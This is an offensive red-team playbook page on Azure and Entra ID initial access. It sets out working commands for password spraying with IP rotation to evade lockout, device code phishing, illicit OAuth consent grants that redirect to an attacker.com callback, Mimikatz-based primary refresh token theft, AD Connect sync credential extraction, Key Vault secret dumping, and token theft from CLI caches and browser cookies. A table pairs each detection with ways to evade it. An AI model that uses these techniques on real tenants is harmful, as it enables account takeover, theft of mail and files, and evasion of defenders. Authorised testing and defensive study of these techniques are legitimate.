# Azure Initial Access
> **MITRE ATT&CK**: Initial Access > T1078.004 - Valid Accounts: Cloud Accounts
> **Platforms**: Azure / Entra ID (Azure AD)
> **Required Privileges**: None (external) to Low
> **OPSEC Risk**: Medium

## Strategic Overview

Azure initial access is deeply intertwined with identity. Because Azure AD (now Entra ID)
serves as the identity provider for Microsoft 365, Azure resources, and thousands of SaaS
applications, compromising a single Azure AD credential can cascade across the entire
Microsoft ecosystem. Red team leads must appreciate that Azure's attack surface extends
far beyond IaaS -- it includes the identity plane, the Microsoft Graph API, and the
deeply integrated Office 365 ecosystem.

## Technical Deep-Dive

### Password Spraying Against Azure AD

```bash
# MSOLSpray - Spray against Azure AD OAuth endpoint
Import-Module MSOLSpray.ps1
Invoke-MSOLSpray -UserList users.txt -Password "Spring2024!" -Url "https://login.microsoft.com"

# o365spray - Validate users then spray
python3 o365spray.py --validate --domain target.com
python3 o365spray.py --spray --domain target.com -U users.txt -P passwords.txt

# Spray against Azure AD using common endpoints
# POST https://login.microsoftonline.com/TENANT/oauth2/token
# Check for: AADSTS50126 (invalid password) vs AADSTS50053 (locked) vs
# AADSTS50076 (MFA required - password was correct!)

# Smart lockout awareness: Azure AD tracks per-IP, so distribute
# Use fireprox or similar to rotate source IPs
python3 fire.py --command create --url https://login.microsoftonline.com
```

### Device Code Phishing

```bash
# Generate device code flow authentication
$body = @{
    "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office client ID
    "resource"  = "https://graph.microsoft.com"
}
$authResponse = Invoke-RestMethod -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode" -Body $body

# Send the user_code and verification_uri to the target via phishing
# "Please go to https://microsoft.com/devicelogin and enter code: XXXXXXXXX"
# Victim authenticates, attacker receives tokens

# Poll for token completion
$tokenBody = @{
    "client_id"  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code"       = $authResponse.device_code
}
$tokens = Invoke-RestMethod -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/token" -Body $tokenBody

# TokenTacticsV2 - Automated device code phishing
Import-Module TokenTacticsV2
Get-AzureTokenFromDeviceCode -Client MSGraph
```

### OAuth Consent Phishing (Illicit Consent Grant)

```bash
# Register a malicious Azure AD application
# Request permissions: Mail.Read, Files.ReadWrite.All, User.Read.All

# Craft consent URL
$consentUrl = "https://login.microsoftonline.com/common/adminconsent?" +
  "client_id=MALICIOUS_APP_ID&" +
  "redirect_uri=https://attacker.com/callback&" +
  "scope=https://graph.microsoft.com/.default"

# If admin clicks and consents, your app gets persistent API access
# to the target tenant via the Microsoft Graph API

# Use the granted tokens to access data
$headers = @{Authorization = "Bearer $accessToken"}
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages" -Headers $headers
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children" -Headers $headers
```

### Primary Refresh Token (PRT) Theft

```bash
# From an Azure AD joined or hybrid-joined device
# PRT is stored in the TPM but can sometimes be extracted

# Check device join status
dsregcmd /status

# ROADtoken - Extract PRT from a device
ROADtoken.exe

# If PRT is obtained, use it to request access tokens for any resource
# PRT acts as an SSO token for the entire Azure AD ecosystem

# Mimikatz - Extract PRT (requires local admin)
mimikatz.exe "privilege::debug" "sekurlsa::cloudap" "exit"
```

### Azure AD Connect Credential Extraction

```bash
# On the Azure AD Connect server (requires local admin)
Import-Module AADInternals

# Extract the sync account credentials (has DCSync-like perms in Azure AD)
Get-AADIntSyncCredentials
# Returns: Tenant, Username (Sync_SERVER_xxx), Password

# These credentials can:
# - Read all Azure AD user attributes including password hashes
# - Write back password changes to on-prem AD
# - Effectively provide Global Admin equivalent access
```

### Exposed Azure Services

```bash
# Azure Storage Account enumeration (anonymous access)
# Check for public blob containers
curl -s "https://targetaccount.blob.core.windows.net/\$root?restype=container&comp=list"
curl -s "https://targetaccount.blob.core.windows.net/public?restype=container&comp=list"

# Azure App Service exposed endpoints
# Check for: .azurewebsites.net, .scm.azurewebsites.net (Kudu)
curl -s "https://target-app.scm.azurewebsites.net/"

# Azure Function URL exposure (function keys in URL)
curl -s "https://target-func.azurewebsites.net/api/function?code=LEAKED_KEY"

# Azure Key Vault - if network rules allow
az keyvault list
az keyvault secret list --vault-name target-vault
az keyvault secret show --vault-name target-vault --name admin-password
```

### Token and Cookie Theft

```bash
# Steal Azure AD tokens from browser
# Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
# Edge: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies
# Look for login.microsoftonline.com cookies

# Token extraction from az CLI cache
type %USERPROFILE%\.azure\accessTokens.json    # Legacy (pre-MSAL)
type %USERPROFILE%\.azure\msal_token_cache.json  # Current

# PowerShell Az module token cache
$context = Get-AzContext
$token = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate(
    $context.Account, $context.Environment, $context.Tenant.Id, $null, "Never", $null, $context.Environment.ActiveDirectoryServiceEndpointResourceId)
$token.AccessToken
```

## Detection & Evasion

| Attack Vector                  | Detection                          | Evasion                                    |
|--------------------------------|------------------------------------|--------------------------------------------|
| Password spray                 | Azure AD Sign-in Logs, Risk Detec  | Slow spray, rotate IPs, target rare users  |
| Device code phishing           | Unusual device code redemption     | Use legitimate client IDs                  |
| Consent phishing               | App consent audit logs             | Request minimal permissions initially      |
| PRT theft                      | Sign-in from unknown device        | Use PRT from same network as victim        |
| AD Connect extraction          | Local audit on ADConnect server    | Already requires local admin               |

## Cross-References

- [Azure AD / Entra ID Attacks](azure-ad-attacks.md)
- [Azure Privilege Escalation](azure-privilege-escalation.md)
- [Azure Persistence](azure-persistence.md)
- [Cloud Attack Methodology](../cloud-methodology.md)

## References

- https://github.com/dafthack/MSOLSpray
- https://github.com/rvrsh3ll/TokenTacticsV2
- https://github.com/Gerenios/AADInternals
- https://learn.microsoft.com/en-us/entra/identity/
- https://posts.specterops.io/
